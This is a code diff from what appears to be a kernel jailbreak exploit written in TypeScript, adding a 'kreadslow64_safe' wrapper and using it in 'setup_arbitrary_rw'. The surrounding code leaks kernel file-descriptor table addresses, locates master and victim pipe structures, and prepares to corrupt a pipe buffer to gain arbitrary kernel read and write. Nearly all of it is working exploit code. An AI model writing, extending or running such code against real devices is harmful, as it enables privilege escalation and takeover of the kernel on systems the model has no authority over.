@@ -1054,20 +1054,20 @@ function exploit_phase_jailbreak () {
 
 function setup_arbitrary_rw () {
   // Leak fd_files from kq_fdp.
-  const fd_files = kreadslow64(kq_fdp)
+  const fd_files = kreadslow64_safe(kq_fdp)
   fdt_ofiles = fd_files.add(0x00)
   debug('fdt_ofiles: ' + hex(fdt_ofiles))
 
-  master_r_pipe_file = kreadslow64(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
+  master_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(master_pipe[0] * FILEDESCENT_SIZE))
   debug('master_r_pipe_file: ' + hex(master_r_pipe_file))
 
-  victim_r_pipe_file = kreadslow64(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
+  victim_r_pipe_file = kreadslow64_safe(fdt_ofiles.add(victim_pipe[0] * FILEDESCENT_SIZE))
   debug('victim_r_pipe_file: ' + hex(victim_r_pipe_file))
 
-  master_r_pipe_data = kreadslow64(master_r_pipe_file.add(0x00))
+  master_r_pipe_data = kreadslow64_safe(master_r_pipe_file.add(0x00))
   debug('master_r_pipe_data: ' + hex(master_r_pipe_data))
 
-  victim_r_pipe_data = kreadslow64(victim_r_pipe_file.add(0x00))
+  victim_r_pipe_data = kreadslow64_safe(victim_r_pipe_file.add(0x00))
   debug('victim_r_pipe_data: ' + hex(victim_r_pipe_data))
 
   // Corrupt pipebuf of masterRpipeFd.
@@ -1526,6 +1526,18 @@ function kreadslow64 (address: BigInt) {
     cleanup()
     throw new Error('Netctrl failed - Reboot and try again')
   }
+  return read64(buffer)
+}
+
+function kreadslow64_safe (address: BigInt): BigInt {
+  const buffer = kreadslow(address, 8)
+
+  if (buffer.eq(BigInt_Error)) {
+    log('kreadslow64_safe: kreadslow returned BigInt_Error at addr ' + hex(address))
+    cleanup()
+    throw new Error('Netctrl failed - Reboot and try again')
+  }
+
   return read64(buffer)
 }
 
